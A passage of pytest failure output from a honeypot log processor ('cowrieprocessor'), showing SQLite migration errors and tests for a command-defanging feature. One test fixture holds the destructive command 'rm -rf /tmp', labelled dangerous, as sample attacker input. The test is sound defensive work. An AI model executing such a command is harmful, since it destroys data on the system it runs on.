            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____ TestIntelligentDefanging.test_no_original_preservation_when_disabled _____

self = <test_bulk_loader_defanging.TestIntelligentDefanging object at 0x7756b43b7790>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_no_original_preservation_0')

    def test_no_original_preservation_when_disabled(self, tmp_path: Path) -> None:
        """Test that original commands are not preserved when disabled."""
        events = [
            {
                "session": "nopreserve123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "bash script.sh",
            },
        ]
        source = tmp_path / "nopreserve_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:248: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77567cce2190>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:15,642:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:15,642:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:15,643:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:15,643:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:15,650:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:15,650:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:15,652:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:15,652:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:15,653:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:15,653:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:15,655:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:15,655:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:15,656:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:15,656:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:15,660:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:15,660:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:15,661:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:15,661:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:15,662:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:15,662:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:15,664:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:15,664:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:15,667:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:15,667:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:15,668:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:15,668:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:15,669:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:15,669:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:15,670:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,670:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,673:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,673:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,673:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,673:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,674:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,674:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,674:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,674:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:15,675:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:15,675:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______________ TestIntelligentDefanging.test_mixed_command_types _______________

self = <test_bulk_loader_defanging.TestIntelligentDefanging object at 0x7756b43b79b0>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_mixed_command_types0')

    def test_mixed_command_types(self, tmp_path: Path) -> None:
        """Test handling of mixed safe and dangerous commands."""
        events = [
            {
                "session": "mixed123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            {
                "session": "mixed123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "ls -la",  # Safe
            },
            {
                "session": "mixed123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "mkdir test",  # Moderate
            },
            {
                "session": "mixed123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:03:00Z",
                "input": "rm -rf /tmp",  # Dangerous
            },
        ]
        source = tmp_path / "mixed_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:298: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x775672cad8d0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:16,254:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:16,254:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:16,255:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:16,255:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:16,263:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:16,263:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:16,265:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:16,265:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:16,266:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:16,266:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:16,268:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:16,268:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:16,270:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:16,270:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:16,273:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:16,273:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:16,274:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:16,274:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:16,275:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:16,275:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:16,277:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:16,277:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:16,279:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:16,279:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:16,280:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:16,280:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:16,281:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:16,281:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:16,282:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,282:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,285:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,285:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,285:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,285:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,286:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,286:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,286:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,286:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:16,287:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:16,287:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
